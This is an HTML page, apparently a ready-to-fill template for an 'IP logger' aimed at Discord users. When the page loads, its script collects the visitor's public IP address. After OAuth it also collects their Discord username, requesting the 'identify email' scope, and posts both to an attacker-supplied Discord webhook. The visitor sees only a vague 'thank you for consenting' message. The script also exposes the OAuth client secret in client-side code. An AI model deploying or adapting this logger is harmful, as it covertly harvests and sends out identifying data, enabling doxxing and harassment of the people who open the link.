<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Logging Info...</title>
</head>
<body>
  <h1>Thank you for consenting. Logging information...</h1>

  <script>
    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // <--- put your webhook URL here
    const clientID = 'YOUR_DISCORD_CLIENT_ID_HERE';      // <--- put your Discord App client ID
    const clientSecret = 'YOUR_DISCORD_CLIENT_SECRET_HERE'; // <--- put your client secret
    const redirectURI = 'YOUR_REDIRECT_URI_HERE';        // <--- should match your GitHub Page or server

    // 1. Fetch user's IP
    async function getIP() {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    }

    // 2. Send IP + Username to Discord webhook
    async function sendToDiscord(ip, username) {
      const payload = {
        username: "Logger Bot",
        content: `**New User Logged!**\nIP Address: \`${ip}\`\nDiscord Username: **${username}**`
      };

      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }

    // 3. If OAuth2 code is present, fetch the Discord username
    async function getDiscordUsername(code) {
      try {
        // Step 1: Exchange code for access token
        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            client_id: clientID,
            client_secret: clientSecret,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectURI,
            scope: 'identify email'
          })
        });

        const tokenData = await tokenResponse.json();
        const accessToken = tokenData.access_token;

        if (!accessToken) {
          throw new Error('Failed to get access token.');
        }

        // Step 2: Use token to fetch user info
        const userResponse = await fetch('https://discord.com/api/users/@me', {
          headers: {
            Authorization: `Bearer ${accessToken}`
          }
        });

        const userData = await userResponse.json();
        return `${userData.username}#${userData.discriminator}`;
      } catch (error) {
        console.error('Error fetching Discord username:', error);
        return 'Unknown User';
      }
    }

    // 4. Get URL params
    function getURLParam(param) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(param);
    }

    // 5. Main logic
    async function start() {
      const code = getURLParam('code');
      const ip = await getIP();
      let username = 'Unknown User';

      if (code) {
        username = await getDiscordUsername(code);
      }

      await sendToDiscord(ip, username);
    }

    start();
  </script>
</body>
</html>
